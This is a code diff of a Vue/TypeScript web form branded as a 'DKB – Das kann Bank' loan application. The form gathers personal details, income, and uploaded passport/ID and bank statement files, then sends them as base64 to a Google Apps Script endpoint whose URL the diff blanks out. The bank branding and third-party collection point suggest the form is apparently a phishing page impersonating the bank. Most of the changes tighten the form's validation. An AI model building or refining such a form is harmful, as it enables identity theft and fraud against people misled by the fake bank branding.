@@ -12,9 +12,11 @@ const form = ref({
   countryOfBirth: "",
   countryOfResidence: "",
   income: "",
+  incomeCurrency: "EUR",
   additionalIncome: "",
+  additionalIncomeCurrency: "EUR",
   email: "",
-  phone: "",
+  phone: "+",
   residentialAddress: "",
   workplace: "",
   position: "",
@@ -23,18 +25,75 @@ const form = ref({
   bankStatementFile: null as File | null,
 });
 
+const hasAdditionalIncome = ref(false);
+
 const isSubmitting = ref(false);
 const errorMessage = ref("");
 const success = ref(false);
-const GOOGLE_SCRIPT_URL =
-  "https://script.google.com/macros/s/AKfycbzt1meTh3t6rBDJV8s6H7U0dO0QdAz8qnlNYs7FdU2Y1uhICyU9SG21IWqcH0bIqTU/exec";
 
+const GOOGLE_SCRIPT_URL =
+  "-";
+function getMaxBirthDate(): string {
+  const today = new Date();
+  const d = new Date(
+    today.getFullYear() - 18,
+    today.getMonth(),
+    today.getDate()
+  );
+  const yyyy = d.getFullYear();
+  const mm = String(d.getMonth() + 1).padStart(2, "0");
+  const dd = String(d.getDate()).padStart(2, "0");
+  return `${yyyy}-${mm}-${dd}`;
+}
+
+const currentYear = new Date().getFullYear();
+function handleNameInput(field: "firstName" | "lastName", e: Event) {
+  const target = e.target as HTMLInputElement;
+  let value = target.value;
+  value = value.replace(/[^A-Za-zА-Яа-яЁё\s'-]/g, "");
+  form.value[field] = value;
+}
+function handleLettersOnlyInput(
+  field: "countryOfBirth" | "countryOfResidence" | "residentialAddress",
+  e: Event
+) {
+  const target = e.target as HTMLInputElement;
+  let value = target.value;
+  value = value.replace(/[0-9]/g, "");
+  form.value[field] = value;
+}
+function handlePhoneInput(e: Event) {
+  const target = e.target as HTMLInputElement;
+  let value = target.value;
+  value = value.replace(/[^\d+]/g, "");
+  if (!value.startsWith("+")) {
+    value = "+" + value.replace(/\D/g, "");
+  } else {
+    const digitsPart = value.slice(1).replace(/\D/g, "");
+    value = "+" + digitsPart;
+  }
+  const digits = value.slice(1).replace(/\D/g, "").slice(0, 11);
+  form.value.phone = "+" + digits;
+}
+function handleWorkplaceInput(e: Event) {
+  const target = e.target as HTMLInputElement;
+  let value = target.value;
+  if (value.length > 50) value = value.slice(0, 50);
+  form.value.workplace = value;
+}
+
+function handlePositionInput(e: Event) {
+  const target = e.target as HTMLInputElement;
+  let value = target.value;
+  if (value.length > 25) value = value.slice(0, 25);
+  form.value.position = value;
+}
 function handleFileChange(e: Event, key: "passportFile" | "bankStatementFile") {
   const target = e.target as HTMLInputElement;
   if (!target.files || !target.files[0]) return;
+  // всегда храним только один файл — новый заменяет старый
   form.value[key] = target.files[0];
 }
-
 function fileToBase64(file: File | null): Promise<string | null> {
   if (!file) return Promise.resolve(null);
   return new Promise((resolve, reject) => {
@@ -48,13 +107,59 @@ function fileToBase64(file: File | null): Promise<string | null> {
     reader.readAsDataURL(file);
   });
 }
-
-
 async function onSubmit() {
   try {
-    isSubmitting.value = true;
     errorMessage.value = "";
     success.value = false;
+    if (!form.value.passportFile || !form.value.bankStatementFile) {
+      errorMessage.value =
+        "Please upload both Passport/ID and Bank statement files.";
+      return;
+    }
+    if (!form.value.dateOfBirth) {
+      errorMessage.value = "Please select your date of birth.";
+      return;
+    }
+    const dob = new Date(form.value.dateOfBirth);
+    const minDob = new Date(getMaxBirthDate());
+    if (dob > minDob) {
+      errorMessage.value = "You must be at least 18 years old.";
+      return;
+    }
+    const incomeNum = Number(form.value.income || 0);
+    if (Number.isNaN(incomeNum) || incomeNum < 0) {
+      errorMessage.value = "Income must be a non-negative number.";
+      return;
+    }
+
+    let additionalIncomeStr = "";
+    let additionalIncomeCurrencyStr = "";
+    if (hasAdditionalIncome.value) {
+      const addNum = Number(form.value.additionalIncome || 0);
+      if (Number.isNaN(addNum) || addNum < 0) {
+        errorMessage.value = "Additional income must be a non-negative number.";
+        return;
+      }
+      additionalIncomeStr = String(addNum);
+      additionalIncomeCurrencyStr = form.value.additionalIncomeCurrency;
+    }
+    const phoneDigits = form.value.phone.replace(/\D/g, "");
+    if (phoneDigits.length !== 11 || !form.value.phone.startsWith("+")) {
+      errorMessage.value =
+        "Contact phone must start with + and contain exactly 11 digits.";
+      return;
+    }
+    const yearNum = Number(form.value.workStartYear);
+    if (
+      Number.isNaN(yearNum) ||
+      yearNum < 1925 ||
+      yearNum > currentYear
+    ) {
+      errorMessage.value = `Year start of work must be between 1925 and ${currentYear}.`;
+      return;
+    }
+
+    isSubmitting.value = true;
 
     const passportBase64 = await fileToBase64(form.value.passportFile);
     const bankStatementBase64 = await fileToBase64(
@@ -67,14 +172,16 @@ async function onSubmit() {
       date_of_birth: form.value.dateOfBirth,
       country_of_birth: form.value.countryOfBirth,
       country_of_residence: form.value.countryOfResidence,
-      income: form.value.income,
-      additional_income: form.value.additionalIncome,
+      income: String(incomeNum),
+      income_currency: form.value.incomeCurrency,
+      additional_income: additionalIncomeStr,
+      additional_income_currency: additionalIncomeCurrencyStr,
       email: form.value.email,
       phone: form.value.phone,
       residential_address: form.value.residentialAddress,
       workplace: form.value.workplace,
       position: form.value.position,
-      work_start_year: form.value.workStartYear,
+      work_start_year: String(yearNum),
       passport_file: passportBase64,
       bank_statement_file: bankStatementBase64,
     };
@@ -88,8 +195,14 @@ async function onSubmit() {
     }
 
     if (form.value.bankStatementFile) {
-      formData.append("bank_statement_file_name", form.value.bankStatementFile.name);
-      formData.append("bank_statement_file_type", form.value.bankStatementFile.type);
+      formData.append(
+        "bank_statement_file_name",
+        form.value.bankStatementFile.name
+      );
+      formData.append(
+        "bank_statement_file_type",
+        form.value.bankStatementFile.type
+      );
     }
     const res = await fetch(GOOGLE_SCRIPT_URL, {
       method: "POST",
@@ -120,26 +233,11 @@ async function onSubmit() {
           <img :src="LogoDkb" alt="DKB" class="h-10 w-auto" />
           <span class="sr-only">DKB – Das kann Bank</span>
         </div>
-
-        <nav
-          class="hidden md:flex items-center text-xs font-medium text-slate-600 gap-6"
-        >
-          <span class="text-blue-600 border-b-2 border-blue-600 pb-1">
-            1. Loan request
-          </span>
-          <span class="pb-1">2. Application</span>
-          <span class="pb-1">3. Account check</span>
-          <span class="pb-1">4. Documents</span>
-          <span class="pb-1">5. Completed</span>
-        </nav>
       </div>
     </header>
     <div class="flex-1">
       <div class="max-w-5xl mx-auto px-4 py-10">
         <div class="mb-8">
-          <p class="text-xs uppercase tracking-wide text-slate-500">
-            Step 2 of 5
-          </p>
           <h1 class="mt-2 text-3xl font-semibold text-slate-900">
             Your personal details
           </h1>
@@ -159,7 +257,8 @@ async function onSubmit() {
                 First name *
               </label>
               <input
-                v-model="form.firstName"
+                :value="form.firstName"
+                @input="(e) => handleNameInput('firstName', e)"
                 type="text"
                 required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
@@ -170,7 +269,8 @@ async function onSubmit() {
                 Last name *
               </label>
               <input
-                v-model="form.lastName"
+                :value="form.lastName"
+                @input="(e) => handleNameInput('lastName', e)"
                 type="text"
                 required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
@@ -183,6 +283,7 @@ async function onSubmit() {
               <input
                 v-model="form.dateOfBirth"
                 type="date"
+                :max="getMaxBirthDate()"
                 required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
               />
@@ -192,7 +293,8 @@ async function onSubmit() {
                 Country of birth *
               </label>
               <input
-                v-model="form.countryOfBirth"
+                :value="form.countryOfBirth"
+                @input="(e) => handleLettersOnlyInput('countryOfBirth', e)"
                 type="text"
                 required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
@@ -203,36 +305,90 @@ async function onSubmit() {
                 Country of residence *
               </label>
               <input
-                v-model="form.countryOfResidence"
+                :value="form.countryOfResidence"
+                @input="(e) => handleLettersOnlyInput('countryOfResidence', e)"
                 type="text"
                 required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
               />
             </div>
-            <div>
+            <div class="flex flex-col">
               <label class="block text-sm font-medium text-slate-700 mb-1">
                 Income (per month) *
               </label>
-              <input
-                v-model="form.income"
-                type="number"
-                min="0"
-                step="0.01"
-                required
-                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-              />
+              <div class="flex gap-2">
+                <input
+                  v-model="form.income"
+                  type="number"
+                  min="0"
+                  step="0.01"
+                  required
+                  class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                />
+                <select
+                  v-model="form.incomeCurrency"
+                  class="rounded-md border border-slate-300 bg-slate-50 px-2 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                >
+                  <option value="EUR">EUR</option>
+                  <option value="USD">USD</option>
+                  <option value="GBP">GBP</option>
+                  <option value="CHF">CHF</option>
+                  <option value="SEK">SEK</option>
+                  <option value="NOK">NOK</option>
+                  <option value="DKK">DKK</option>
+                </select>
+              </div>
             </div>
-            <div>
+            <div class="flex flex-col">
               <label class="block text-sm font-medium text-slate-700 mb-1">
                 Additional income
               </label>
-              <input
-                v-model="form.additionalIncome"
-                type="number"
-                min="0"
-                step="0.01"
-                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-              />
+              <div class="flex items-center gap-4 text-sm mb-2">
+                <label class="inline-flex items-center gap-1">
+                  <input
+                    type="radio"
+                    class="h-4 w-4"
+                    :checked="hasAdditionalIncome"
+                    @change="hasAdditionalIncome = true"
+                  />
+                  <span>Yes</span>
+                </label>
+                <label class="inline-flex items-center gap-1">
+                  <input
+                    type="radio"
+                    class="h-4 w-4"
+                    :checked="!hasAdditionalIncome"
+                    @change="
+                      hasAdditionalIncome = false;
+                      form.additionalIncome = '';
+                    "
+                  />
+                  <span>No</span>
+                </label>
+              </div>
+
+              <div v-if="hasAdditionalIncome" class="flex gap-2">
+                <input
+                  v-model="form.additionalIncome"
+                  type="number"
+                  min="0"
+                  step="0.01"
+                  class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                  placeholder="Enter additional income amount"
+                />
+                <select
+                  v-model="form.additionalIncomeCurrency"
+                  class="rounded-md border border-slate-300 bg-slate-50 px-2 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                >
+                  <option value="EUR">EUR</option>
+                  <option value="USD">USD</option>
+                  <option value="GBP">GBP</option>
+                  <option value="CHF">CHF</option>
+                  <option value="SEK">SEK</option>
+                  <option value="NOK">NOK</option>
+                  <option value="DKK">DKK</option>
+                </select>
+              </div>
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
@@ -250,10 +406,12 @@ async function onSubmit() {
                 Contact phone *
               </label>
               <input
-                v-model="form.phone"
+                :value="form.phone"
+                @input="handlePhoneInput"
                 type="tel"
                 required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                placeholder="+12345678901"
               />
             </div>
             <div class="md:col-span-2">
@@ -261,7 +419,8 @@ async function onSubmit() {
                 Residential address *
               </label>
               <input
-                v-model="form.residentialAddress"
+                :value="form.residentialAddress"
+                @input="(e) => handleLettersOnlyInput('residentialAddress', e)"
                 type="text"
                 required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
@@ -272,9 +431,11 @@ async function onSubmit() {
                 Work place *
               </label>
               <input
-                v-model="form.workplace"
+                :value="form.workplace"
+                @input="handleWorkplaceInput"
                 type="text"
                 required
+                maxlength="50"
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
               />
             </div>
@@ -283,9 +444,11 @@ async function onSubmit() {
                 Position *
               </label>
               <input
-                v-model="form.position"
+                :value="form.position"
+                @input="handlePositionInput"
                 type="text"
                 required
+                maxlength="25"
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
               />
             </div>
@@ -296,15 +459,15 @@ async function onSubmit() {
               <input
                 v-model="form.workStartYear"
                 type="number"
-                min="1950"
-                max="2100"
+                :min="1925"
+                :max="currentYear"
                 required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
               />
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Passport / ID (upload)
+                Passport / ID (upload) *
               </label>
               <label
                 class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500 cursor-pointer"
@@ -328,7 +491,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Bank statement (upload)
+                Bank statement (upload) *
               </label>
               <label
                 class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500 cursor-pointer"
